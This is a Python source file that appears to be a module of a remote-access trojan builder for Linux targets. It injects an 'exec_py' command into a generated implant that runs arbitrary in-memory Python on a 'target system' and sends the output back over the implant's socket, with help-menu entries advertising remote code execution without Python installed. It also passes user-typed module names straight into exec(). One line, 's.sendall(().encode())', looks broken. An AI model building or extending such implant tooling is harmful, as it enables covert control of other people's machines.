# WEB + COM
# done
import library.modules.config as config
config.main()
interface = config.interface
if interface == "GUI":
    from flask import jsonify
    from json import loads
elif interface == "CUI":
    import time


def main(option, prompt = None):
    if option == 'generate':
        config.import_statements.append('import sys')
        config.import_statements.append('from io import StringIO')
        if interface == "GUI":
            conditions = loads(prompt)
            list_of_modules = []
            if conditions['execute_python_modules_present']:
                list_of_modules = conditions['execute_python_modules']
            for module_to_load in list_of_modules:
                try:
                    if module_to_load != "":
                        exec('import ' + module_to_load)
                        config.app.logger.info("[components/linux/control/execute_python] - Valid module, loaded on")
                        config.import_statements.append('import ' + module_to_load)
                except (ImportError, SyntaxError):
                    config.app.logger.error("[components/linux/control/execute_python] - Invalid module, not loaded on")
        elif interface == "CUI":
            print(config.war + 'Manual intervention required for python_execute component')
            while True:
                try:
                    module_to_load = input('\x1b[1m\x1b[37m[\x1b[0m\033[92m' +
                                           '\x1b[1m\x1b[31mlinux/control/execute_python\x1b[0m' +
                                           '\x1b[1m\x1b[37m > ]\x1b[0m ' + 'Input name of other library to package into python_execute [CTRL-C to quit] : ')
                    if not module_to_load:
                        print(config.neg + 'Input the name of a module')
                        continue
                    try:
                        exec('import ' + module_to_load)
                        print(config.pos + 'Valid module, loaded on')
                        config.import_statements.append('import ' + module_to_load)
                    except (ImportError, SyntaxError):
                        print(config.neg + 'Invalid module, not loaded on')
                except EOFError:
                    try:
                        time.sleep(2)
                    except KeyboardInterrupt:
                        print('\n' + config.pos + 'Done...')
                        break
                except KeyboardInterrupt:
                    print('\n' + config.pos + 'Done...')
                    break
        config.functions.append('''
def exec_py(command):
    command = command.split(' ', 1)[1]
    old_stdout = sys.stdout
    result = StringIO()
    sys.stdout = result
    try:
        exec(command)
    except Exception as e:
        result.write(str(e) + '\\n')
    sys.stdout = old_stdout
    result_string = result.getvalue()
    s.sendall(().encode())
    main_send('[*]Result of code : \\n\\n' + result_string, s)
''')
        config.logics.append('''
            elif command == "exec_py":
                exec_py(data)''')
        config.help_menu['exec_py <python command>'] = 'Execute in-memory arbitrary python code on the target system'
        config.help_menu[
            'exec_py_script'] = 'Script in the terminal a block of in-memory arbitrary python code to execute on the target system'
        config.help_menu[
            'exec_py_file <Local file path>'] = 'Execute arbitrary python code from a file to execute on the target system in-memory'
    elif option == 'info':
        if interface == "GUI":
            return {
                "Name": "Execute python component",
                "OS": "Linux",
                "Required Modules": "io, sys, <any module you can load in>",
                "Commands": "exec_py <python command>",
                "Description": "Execute in-memory arbitrary python code on the target system (remote interpreter that does not require python to be installed!)"
            }
        elif interface == "CUI":
            print('\nName             : Execute python component' \
                  '\nOS               : Linux' \
                  '\nRequired Modules : io, sys, <any module you can load in>' \
                  '\nCommands         : exec_py <python command>' \
                  '\nDescription      : Execute in-memory arbitrary python code on the target system (remote interpreter that does not require python to be installed!)\n')
